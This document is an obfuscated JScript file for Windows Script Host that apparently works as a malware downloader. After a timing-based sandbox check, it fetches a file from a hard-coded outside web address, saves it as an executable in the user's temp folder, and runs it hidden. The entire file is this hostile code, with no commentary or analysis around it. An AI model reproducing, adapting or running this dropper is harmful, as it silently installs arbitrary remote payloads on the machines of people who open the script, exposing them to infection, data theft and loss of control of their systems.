var QC = false;
var UP = "CreateObject";
var z = function ao() {return WScript[UP]("WScript.Shell");}(), s = 11;
var jy = "MSXML2.XMLHTTP";
var n = 2123213;
var Jm = 0;
function mr(l){z["Run"](l, Jm, Jm);};
function H(){return "" + jy;};
function Ng(t, M){Jm = Jm * 1; return t - M;};
function UB(){return UP;};
/*@cc_on
  @if (@_win32 || @_win64)
    QC = true;
  @end
@*/
if (QC)
{
var x = "";
function CZ(){return 22;};
var o = 0; var H1 = 0;
function ea()
{
var Tr = new this["Date"]();
var H0 = Tr["getUTCMilliseconds"]();
WScript["Sleep"](CZ());
var Tr = new this["Date"]();
var XF = Tr["getUTCMilliseconds"]();
WScript["Sleep"](CZ());
var Tr = new this["Date"]();
var V = Tr["getUTCMilliseconds"]();
var o = "zC";
o = Ng(XF, H0);
var H1 = "A0";
H1 = Ng(V, XF);
x = "open";
return Ng(o, H1);
}
var A1 = false;
var mB = false;
for (var hP = Jm; hP < CZ() * 1; hP++){if (ea() != Jm){
A1 = true; 
H1 = "31" + 11 * o + H1; 
mB = true; 
break;
}}
function i() {return ((A1 == true) && (A1 == mB)) ? 1 : Jm;};
if (A1 && i() && mB){
function XT() {return z["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2lbnKfeg8F.exe";};
 B0 = H();
 B = WScript[UP](B0);
 var A = 1;
 while (A){
try {
B[x]("GET", "http://cngfloristsundries.co.uk/mo4erp", false);
B["send"]();
P = "Sleep";
for (;;){WScript[P](CZ() * 11); if (B["readystate"] >= 2 * 2) break;};
A = Jm;
} catch(S){};
}
function hE(bo) {var Yf = (1, 2, 3, 4, 5, bo); return Yf;};
ps = WScript[UB()]("ADODB.Stream");
B0 = ps;
B0[x]();
B0["type"] = hE(1);
B0["write"](B["ResponseBody"]);
ps["position"] = hE(Jm);
B0["Save" + "ToFile"](XT(), 2);
ps["c"+"lose"]();
f = XT();
mr(f);
}
}

